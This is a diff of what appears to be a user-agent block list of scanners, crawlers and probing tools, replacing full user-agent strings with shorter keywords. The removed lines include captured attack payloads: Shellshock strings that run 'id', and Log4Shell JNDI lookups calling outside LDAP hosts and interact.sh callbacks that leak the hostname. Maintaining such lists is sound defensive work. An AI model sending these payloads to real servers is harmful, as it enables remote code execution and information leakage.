@@ -631,79 +631,81 @@ x22Mozilla
 xpymep1.exe
 zauba.io
 zgrab
-Mozilla/5.0 zgrab/0.x
-Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)
-Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
-Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)
-Mozilla/5.0 [en] (X11, U; OpenVAS-VT 9.0.3)
+zgrab/0.x
+CensysInspect
+censys
+YandexBot
+yandex
+OpenVAS-VT
 l9explore/1.3.0
 Fuzz Faster U Fool v1.3.1
 Fuzz
-Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
-masscan/1.3 (https://github.com/robertdavidgraham/masscan)
-Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com
-masscan-ng/1.3 (https://github.com/bi-zone/masscan-ng)
+Nmap
+nmap
+masscan
+expanseinc
+masscan-ng
 Hello, World
 AHC/2.1
-l9tcpid/v1.1.0
+l9tcpid
 Hello, world
 Nacos-Server
-Mozilla/5.0 [en] (X11, U; Mozilla-VT 21.4.3)
-Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)
-Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)
+Sogou web spider
+webmasters
+Baiduspider-render
+baidu
 fasthttp
-facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
-CCBot/2.0 (https://commoncrawl.org/faq/)
+facebookexternalhit
+externalhit_uatext
+CCBot
+commoncrawl
 ZmEu
-Mozilla/5.0 (compatible; YandexFavicons/1.0; +http://yandex.com/bots)
+YandexFavicons/1.0
+yandex
 Anarchy99
-ds9 2.000.ec2(+http://www.deepsearchnine.com/ds9.html)
+ds9 2.000.ec2
+deepsearchnine
 Fuzz Faster U Fool v1.3.1-dev
-() { _; OpenVASVT; } >_[$($())] { echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }
-${jndi:ldap://121.140.99.236:1389/Exploit}
-DomainStatsBot/1.0 (https://domainstats.com/pages/our-bot)
-TprAdsTxtCrawler/1.1
-ltx71 - (http://ltx71.com/)
+DomainStatsBot
+TprAdsTxtCrawler
+ltx71
 Embarcadero URI Client/1.0
 XTC
 example/client
 Metascraper
 MindManager
 bitdiscovery
-() { OpenVASVT:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;
-${jndi:ldap://45.153.240.94:1389/drydat}
-l9plugin-ElasticSearchExplorePlugin/v1.0.0 (+https://leakix.net/)
-lua-resty-http/0.07 (Lua) ngx_lua/10012
-AwarioSmartBot/1.0 (+https://awario.com/bots.html; bots@awario.com)
+OpenVASVT
+drydat
+l9plugin-ElasticSearchExplorePlugin
+leakix
+AwarioSmartBot
+awario
 DF Bot 1.0
-'Mozilla/5.0 project_patchwatch'
-${jndi:ldap://45.153.240.94:1389/8rjbzw}
-l9plugin-ElasticSearchOpenPlugin/v1.0.0 (+https://leakix.net/)
-lua-resty-http/0.10 (Lua) ngx_lua/10019
-() { _; MozillaVT; } >_[$($())] { echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }
-Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)
-Mozilla/5.0 (compatible; YandexNews/4.0; +http://yandex.com/bots)
+patchwatch
+l9plugin-ElasticSearchOpenPlugin
+YandexNews
+yandex
 ds9 2.000.ec2
-masscan/1.0 (https://github.com/robertdavidgraham/masscan)
+masscan
 AccompanyBot
-() { MozillaVT:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;
-Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
+Baiduspider
+baidu
 useragent.scanworld.net
 scanworld
-${jndi:ldap://127.0.0.1#54.209.119.150.c7g9qc52vtc0000e96cggda8ksoyyyyyn.interact.sh:1389/ejo751k}
-WebZIP/3.5 (http://www.spidersoft.com)
-GRequests/0.10
-ZaldomoSearchBot(www.zaldamo.com/search.html)
-${jndi:ldap://127.0.0.1#.${hostName}.useragent.c7dkks3cl2ecrs2tsuogc8pwzkayyyyns.interact.sh}
-facebookscraper/1.0( http://www.facebook.com/sharescraper_help.php)
-${jndi:ldap://127.0.0.1#.${hostName}.useragent.c7eg6ht6qnod69a50segc8qoj3oyyyydo.interact.sh}
-Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com
-Baiduspider ( http://www.baidu.com/search/spider.htm)
-SuperBot/4.4.0.60 (Windows XP)
-Faraday v0.15.4
-Watch1,2/4.3.2 (15U70)
-ScanSSH/2.0
-${jndi:ldap://127.0.0.1#54.209.119.150.c7g9qc52vtc0000e96cggda8ksoyyyyyn.interact.sh/ejo751k}
-aria2/1.35.0
-${jndi:ldap://10.81.0.3:31166/a}
-{jndi:dns://3-86-131-164.useragent.scanworld.net}
+WebZIP
+spidersoft
+GRequests
+ZaldomoSearchBot
+zaldamo
+facebookscraper
+paloaltonetworks
+Expanse
+Baiduspider
+SuperBot
+windosXP
+Faraday
+Watch
+15U70
+ScanSSH
+aria2
